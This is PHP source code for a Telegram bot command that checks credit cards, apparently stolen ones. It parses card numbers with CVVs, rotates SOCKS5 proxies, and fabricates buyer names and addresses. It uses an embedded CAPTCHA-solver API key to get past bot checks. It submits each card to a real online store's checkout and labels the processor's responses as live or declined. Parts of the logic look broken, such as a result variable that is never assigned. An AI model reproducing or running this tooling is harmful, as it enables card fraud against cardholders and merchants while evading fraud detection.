<?php



list($cmd) = explode(" ", $message);
if($cmd == "/ct" or $cmd == ".ct" or $cmd == "!ct"){
$NameGater ='Citlalli';
$gateway = "/ct $NameGater";


is_gateroff($NameGater); //off Gater
is_premium(); // true ´Premium
deleteprm($userId); // delete Premium
Contador($gateway);

IS_BANNED($userId,$chatId,$message_id);
sendaction($chatId, typing);

deleteprm($userId);

$lista = substr($message, 4);

if(empty($lista)){
$lista = $r_msg;
}if(empty($lista)){
$lista = $q_msg;}

if(empty($lista)){
bot('sendMessage', [
                'chat_id' =>$chatId,
                'disable_web_page_preview' => true,
    'reply_to_message_id'=>$message_id,
    'parse_mode'=>'HTML',
                'text' =>"<b>[<a href='https://t.me/ritabotchk/35'>ϟ</a>] Gate Auth: >_ $-Security System ⚠️
━━━━━━━━━━━━━━━━
[<a href='https://t.me/ritabotchk/35'>ϟ</a>] Gateway: <code>$NameGater</code>
[<a href='https://t.me/ritabotchk/35'>ϟ</a>] Pasarela: <code>Braintree - Auth</code>
[<a href='https://t.me/ritabotchk/35'>ϟ</a>] Status: <code>ONLINE! 🟩</code>
[<a href='https://t.me/ritabotchk/35'>ϟ</a>] Format: <code>!ct card|month|year|cvv</code>
━━━━━━━━━━━━━━━━</b>"
                ]);
        die();
}

$tiempo_inicial = microtime(true);

$card = json_encode(Parser1($lista));
$card = json_decode($card, true);
$cc = $card["card"];
$mes = $card["MES"];
$ano = $card["ANO"];
$cvv = $card["CVV"];
$valid = $card["valid"];


if($valid == "ERROR"){
reply_to($chatId,$message_id,$keyboard,"<b>Invalid format</b>");
die();
}

if(bannedbin(substr($cc, 0,6)) == true){
reply_to($chatId,$message_id,$keyboard,"<b>Bin Banned</b>.");
exit();
}

if ($gId == $Mi_Id) $Rank = "Owner";
elseif (verifiAdmin($userId)) $Rank = "Admin";
elseif (veritimepremium($userId)) $Rank = infouser($userId)['apodo'];
elseif (verifiCharAdmin($chatId)) $Rank = "Free User";
elseif (verifiUser($userId)) $Rank = "Free user";

is_Antispma($userId, $chatId, $messageId, $keyboard);
    
    
$res = bininfo(substr($cc, 0,6));
$type = $res['type'];
$bank = $res['bank'];
$brand = $res['brand'];
$scheme = $res['level'];
$country = $res['country'];
$emoji = $res['Emoji'];

if($scheme == 'PREPAID'){
reply_to($chatId,$message_id,$keyboard,"<b>Bin PREPAID Banned</b>.");
die();
}

$messageidtoedit1 = bot('sendMessage', [
    'chat_id' =>$chatId,
    'disable_web_page_preview' => true,
'reply_to_message_id'=>$message_id,
'parse_mode'=>'HTML',
    'text' =>"<b>[<a href='https://t.me/ritabotchk/35'>ϟ</a>] Gate Auth: >_ $-Braintree - Auth
━━━━━━━━━━━━━━━━
[<a href='https://t.me/ritabotchk/35'>ϟ</a>] Status: <code>WAIT A FEW SECONDS 🟥</code>
[<a href='https://t.me/ritabotchk/35'>ϟ</a>] Gateway: <code>$NameGater</code>
[<a href='https://t.me/ritabotchk/35'>ϟ</a>] Card: <code>$cc|$mes|$ano|$cvv</code> 
━━━━━━━━━━━━━━━━
[<a href='https://t.me/ritabotchk/35'>ϟ</a>] Country: <code>$country - $emoji</code>
[<a href='https://t.me/ritabotchk/35'>ϟ</a>] Type: <code>$type - $brand - $scheme</code>
[<a href='https://t.me/ritabotchk/35'>ϟ</a>] Bank: <code>$bank</code> 
━━━━━━━━━━━━━━━━
[<a href='https://t.me/ritabotchk/35'>ϟ</a>] Checked by: <a href='tg://user?id=$userId'>$username</a>[<code>$Rank</code>]
━━━━━━━━━━━━━━━━</b>"
]);

$messageidtoedit = capture(json_encode($messageidtoedit1), '"message_id":', ',');

antisppre($userId); //Premium
antispFree($userId); //Free User



$rotate = rotate();
$socks5 = socks5();
$url = "https://api.ipify.org/"; 
       
$ch = curl_init(); 

curl_setopt($ch, CURLOPT_URL, $url); 
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1); 
curl_setopt($ch, CURLOPT_PROXY,$socks5); 
curl_setopt($ch, CURLOPT_PROXYUSERPWD,$rotate); 
$ip1 = curl_exec($ch); 
curl_close($ch); 
ob_flush(); 
if (isset($ip1)) { 
  $ip = "Live"; 
} 
if (empty($ip1)) { 
    bot('editMessageText',[
        'chat_id'=>$chatId,
        'message_id'=>$messageidtoedit,
        'text'=>"<b>Proxy dead</b>",
    'parse_mode'=>'html',
    'reply_to_message_id'=> $message_id]);
    die();
}
#EMPIEZA EL PROCESO DE CHEQUEO

if($mes < 10) {
$mes = substr($mes, -1);
};

$n9va = new StrangerN9na();

$cookies = uniqid();

//=============================== [ FAKE DATA ] ===============================//

$get = file_get_contents("https://randomuser.me/api/1.2/?nat=us");
$firstname = ucfirst($n9va->getStrnv($get, '"first":"', '"'));
$lastname = ucfirst($n9va->getStrnv($get, '"last":"', '"'));
$numero1 = substr($phone, 1,3);
$numero2 = substr($phone, 6,3);
$numero3 = substr($phone, 10,4);
$phone = $numero1.''.$numero2.''.$numero3;
$email = $firstname . rand(1111, 9999) . "%40gmail.com";
$password = substr(str_shuffle('abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789'), 0, 8);

//=============================== [ STREET DATA ] ===============================//

$get = file_get_contents("https://www.worldnamegenerator.com/");
$street = (trim(strip_tags($n9va->getStrnv($get,'<td>Street','</tr>'))));
$city = strtoupper(trim(strip_tags($n9va->getStrnv($get,'<td>City','</tr>'))));
$regioncode = strtoupper(strip_tags($n9va->getStrnv($get,'<td>State/Province abbr','</b></td>')));
$state = trim(strip_tags($n9va->getStrnv($get,'<td>State/Province full','</b></td>')));
$zip = trim(strip_tags($n9va->getStrnv($get,'<td>Zip Code/Postal code','</tr>')));




$solver = new \Capsolver\CapsolverClient('CAP-5361C0C774F336BECC410D69E869566E');


$curl = ShopifyIa('https://www.totaldiabetessupply.com/pages/privacy-policy%5C',"$cc|$mes|$ano|$cvv", $solver);

$resp = GetStr($curl, '<p class="notice__text">', '</p>');
$tiempo_final = microtime(true);
$tiempo = $tiempo_final - $tiempo_inicial;
$tiempo = substr($tiempo, 0, 4);
if(strlen($mes) == 1){
    $mes = '0'.$mes;
}

bot('editMessageText',[
    'chat_id'=>$chatId,
    'disable_web_page_preview' => true,
    'message_id'=>$messageidtoedit,
    'text'=>"<b>[<a href='https://t.me/ritabotchk/35'>ϟ</a>] Gate Auth: >_ $-Braintree - Auth
━━━━━━━━━━━━━━━━
[<a href='https://t.me/ritabotchk/35'>ϟ</a>] Status: <code>ALMOST FINISHED 🟩</code>
[<a href='https://t.me/ritabotchk/35'>ϟ</a>] Gateway: <code>$NameGater</code>
[<a href='https://t.me/ritabotchk/35'>ϟ</a>] Card: <code>$cc|$mes|$ano|$cvv</code> 
━━━━━━━━━━━━━━━━
[<a href='https://t.me/ritabotchk/35'>ϟ</a>] Country: <code>$country - $emoji</code>
[<a href='https://t.me/ritabotchk/35'>ϟ</a>] Type: <code>$type - $brand - $scheme</code>
[<a href='https://t.me/ritabotchk/35'>ϟ</a>] Bank: <code>$bank</code> 
━━━━━━━━━━━━━━━━
[<a href='https://t.me/ritabotchk/35'>ϟ</a>] Checked by: <a href='tg://user?id=$userId'>$username</a>[<code>$Rank</code>]
━━━━━━━━━━━━━━━━</b>",
'parse_mode'=>'html',
'reply_to_message_id'=> $message_id]);



if ((strpos($result2, "Security code was not matched by the processor")) || ("2010 Card Issuer Declined CVV" == $result2) || (strpos($result2, "The card's security code is incorrect."))){
$status = "Approved! ✅";
$response = "2010 Card Issuer Declined CVV🟩";
}elseif ((strpos($result2, '2001 Insufficient Funds')) ||("2001 Insufficient Funds" == $result2)){ 
$status = "Approved!🟩";
$response = "2001 Insufficient Funds 🟩";
}
elseif($result2 == "Your order is confirmed"){ 
    $status = "Approved! ✅";
    $response = "Charger (12$) ";
}elseif (strpos($result, "generic_decline")){ 
$status = "Live🟩";
$response = "CVV 🟩";
}elseif (strpos($result2, "card_error_authentication_required") ||(strpos($result2,'three_d_secure_redirect'))){ 
$status = "Declined! 🔴";
$response = "3D Card.❌";
}elseif($result2 == "MaxReties 7"){ 
$status = "Declined! 🔴";
$response = "2000	Do Not Honor";
}elseif (strpos($result2, "do_not_honor")){ 
$status = "Declined! 🔴";
$response = "do_not_honor";
}elseif (strpos($result2, 'he transaction total has been updated to reflect added tax based on your shipping country. Please review the new total and confirm your payment.') || (strpos($result2,"Verification steps confirmed. Your payment is processing"))) {
    $status = "Approved!🟩";
    $response = "Card Approved🟩";
}
elseif (strpos($result2, "invalid_account")){ 
$status = "Declined! 🔴";
$response = "invalid_account";

}elseif ((strpos($result2, "Your card does not support this type of purchase.")) || (strpos($result2, "transaction_not_allowed"))){
    $status = "<b>CARD DECLINED ❌</b>";
    $response = "Your card does not support this type of purchase🟥";
}elseif ((strpos($result2, "pickup_card")) || (strpos($result2, "lost_card")) || (strpos($result2, "stolen_card"))){
    $status = "<b>CARD DECLINED ❌</b>";
    $response = "<b>LOST CARD</b>";
  }
  elseif ((strpos($result2, "fraudulent")) || (strpos($result2, "lost_card")) || (strpos($result2, "fraudulent card"))){
    $status = "<b>Declined! 🔴</b>";
    $response = "<b>FRAUDULENT CARD</b>";
  }elseif ((strpos($result2, 'Your card has expired.')) || (strpos($result1, 'expired_card'))){
    $status = "<b>CARD EXPIRED ❌</b>";
    $response = "<b>EXPIRED CARD</b>";
  }
  elseif ((strpos($result2, 'The card number is incorrect.')) || (strpos($result2, 'Your card number is incorrect.')) || (strpos($result2, 'Call to a member function')) || (strpos($result2, 'incorrect_number'))){
    $status = "<b>INVALID CARD ❌</b>";
    $response = "<b>INCORRECT NUMBER</b>";
  }
  elseif ((strpos($result2, 'Sorry, there was an error completing your purchase -- please try again.')) || (strpos($result2, 'Your card number is incorrect.')) || (strpos($result2, 'Call to a member function')) || (strpos($result2, 'incorrect_number'))){
    $status = "<b>Declined! 🔴</b>";
    $response = "<b>try again</b>";
  }
  elseif ((strpos($result2, 'The card number is incorrect.')) || (strpos($result2, 'incorrect-number')) || (strpos($result2, 'incorrect_number'))){
$status = "<b>Declined! 🔴</b>";
$response = "<b>INCORRECT NUMBER</b>";
}elseif (strpos($result2, "generic_decline")){
$status = "<b>Declined! 🔴</b>";
$response = "<b>GENERIC DECLINE</b>";
}elseif ($result2 == 'Your payment details couldn’t be verified. Check your card details and try again.'){ 
$status = "Declined! 🔴";
$response = "2014 Processor Declined";
}
elseif ($result2 == 'RETRY MX'){ 
$status = "Declined! 🔴";
$response = "2014 Processor Declined";
}
elseif ($result2 == 'There was a problem processing the payment. Try refreshing this page or check your internet connection.'){ 
$status = "Declined! 🔴";
$response = "2014 Processor Declined";
}else{
$status = "Declined! 🔴";
$response = "Declined";
   }

bot('editMessageText',[
    'chat_id'=>$chatId,
    'disable_web_page_preview' => true,
    'message_id'=>$messageidtoedit,
    'text'=>"<b>[<a href='https://t.me/ritabotchk/35'>ϟ</a>] Gate CCN: >_ $-Braintree - Auth
━━━━━━━━━━━━━━━━
[<a href='https://t.me/ritabotchk/35'>ϟ</a>] Card: <code>$cc|$mes|$ano|$cvv</code> 
[<a href='https://t.me/ritabotchk/35'>ϟ</a>] Status: <code>$status</code>
[<a href='https://t.me/ritabotchk/35'>ϟ</a>] Response: <code>$response</code>
━━━━━━━━━━━━━━━━
[<a href='https://t.me/ritabotchk/35'>ϟ</a>] Country: <code>$country - $emoji</code>
[<a href='https://t.me/ritabotchk/35'>ϟ</a>] Type: <code>$type - $brand - $scheme</code>
[<a href='https://t.me/ritabotchk/35'>ϟ</a>] Bank: <code>$bank</code> 
━━━━━━━━━━━━━━━━
[<a href='https://t.me/ritabotchk/35'>ϟ</a>] Card Check info: Proxy's: <code>Live ✅</code> 
[<a href='https://t.me/ritabotchk/35'>ϟ</a>] Time: <code>$tiempo</code> | Gate: <code>$NameGater</code>
[<a href='https://t.me/ritabotchk/35'>ϟ</a>] Checked by: <a href='tg://user?id=$userId'>$username</a>[<code>$Rank</code>]
━━━━━━━━━━━━━━━━</b>",
'parse_mode'=>'html',
'reply_to_message_id'=> $message_id]);

}

